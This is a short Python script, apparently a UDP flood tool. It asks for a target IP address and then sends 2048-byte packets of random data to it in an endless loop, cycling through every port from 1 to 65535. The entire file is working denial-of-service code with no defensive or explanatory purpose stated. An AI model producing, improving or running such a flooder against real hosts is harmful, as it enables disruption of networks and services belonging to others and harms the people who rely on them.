import socket
import random

soc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(2048)

ip = raw_input("Enter ip: ")
sent = 1
while 1:
	soc.sendto(bytes,(ip,sent))
	print "Sent %s amount of packet to %s at port %s"%(sent,ip,sent)
	sent += 1
	if sent == 65535:
		sent  = 1